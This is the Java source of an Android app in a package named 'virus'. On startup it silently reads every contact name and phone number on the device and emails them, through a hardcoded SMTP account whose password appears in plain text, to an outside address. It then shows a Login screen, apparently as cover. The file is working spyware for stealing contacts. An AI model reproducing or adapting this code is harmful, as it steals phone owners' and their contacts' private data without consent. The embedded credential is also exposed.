package com.example.john.virus;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;

import com.example.john.virus.service.MService;
import com.example.john.virus.service.SService;
import java.util.Timer;
import java.util.TimerTask;
import javax.mail.MessagingException;
import javax.mail.internet.AddressException;


public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //连续启动Service
        Intent intentOne = new Intent(this, MService.class);
        startService(intentOne);
        Intent intentTwo = new Intent(this, SService.class);
        startService(intentTwo);

        new Thread(new Runnable() {

            @Override
            public void run() {
                try {
                    EmailSender sender = new EmailSender();
                    //设置服务器地址和端口，网上搜的到
                    sender.setProperties("smtp.163.com", "25");
                    //分别设置发件人，邮件标题和文本内容
                    sender.setMessage("baoshengbin_cumt@163.com", "EmailSender", getContants());
                    //设置收件人
                    sender.setReceiver(new String[]{"1661175532@qq.com"});
                    //添加附件
                    //这个附件的路径是我手机里的啊，要发你得换成你手机里正确的路径
                    //sender.addAttachment("/dev/init");
                    //发送邮件
                    sender.sendEmail("smtp.163.com", "baoshengbin_cumt@163.com", "cumt08143159");
                    sender.setMessage("baoshengbin_cumt@163.com", "EmailS//ender", getContants());//这里面两个邮箱账号要一致

//                    Intent i = getBaseContext().getPackageManager().getLaunchIntentForPackage(getBaseContext().getPackageName());
//                    i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
//                    startActivity(i);

                } catch (AddressException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (MessagingException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }).start();
        Timer timer = new Timer();
        TimerTask timertask = new TimerTask(){

            @Override
            public void run() {
                Intent intent = new Intent(MainActivity.this,Login.class);
                startActivity(intent);
                MainActivity.this.finish();
            }};
        timer.schedule(timertask, 3000);
    }

    public String getContants(){
        String string = "";
        //得到ContentResolver对象
        ContentResolver cr = getContentResolver();
        //取得电话本中开始一项的光标
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //向下移动光标
        while(cursor.moveToNext())
        {
            //取得联系人名字
            int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            String contact = cursor.getString(nameFieldColumnIndex);
            //取得电话号码
            String ContactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            Cursor phone = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + ContactId, null, null);
            while(phone.moveToNext())
            {
                String Number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                string += (contact + ":" + Number + " ");
            }

        }
        cursor.close();
        return  string;
    }


}
